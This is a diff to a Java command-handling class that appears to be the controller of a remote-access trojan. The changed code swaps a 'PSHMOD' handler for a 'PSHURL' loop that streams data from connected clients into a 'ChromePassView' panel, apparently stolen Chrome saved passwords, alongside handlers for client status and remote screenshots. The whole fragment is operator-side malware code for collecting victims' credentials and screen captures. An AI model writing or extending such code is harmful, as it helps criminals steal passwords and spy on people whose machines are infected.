@@ -53,8 +53,27 @@ class ProcessCommands implements Repository {
                 client.setOnlineStatus("Online");
                 Controller.updateStats();
                 Controller.updateTable();
-            } else if (input.contains("PSHMOD")){
-                  ChromePassView.getResultsArea().setText(readFromDis(dis));
+            } else if (input.contains("PSHURL")){
+                //StringBuilder fullContent = new StringBuilder();
+                while (true) {
+                    String content = readFromDis(dis);
+                    if (content == null || content.equals(null)) {
+                        continue;
+                    }
+                    if (content.trim().equals("ENDPSH")) {
+                        break;
+                    }
+                    try{
+                        Thread.sleep(50); // DO NOT REMOVE
+                    } catch (InterruptedException e){
+                        e.printStackTrace();
+                    }
+                    ChromePassView.getResultsArea().appendText(content + "\n");
+                    //fullContent.append(content);
+                }
+                //System.out.println(fullContent.toString());
+
+                //ChromePassView.getResultsArea().setText(fullContent.toString());
             } else if (input.contains("SCREENSHOT")) {
                 // SERVER: SCREENSHOT
                 // CLIENT: filename
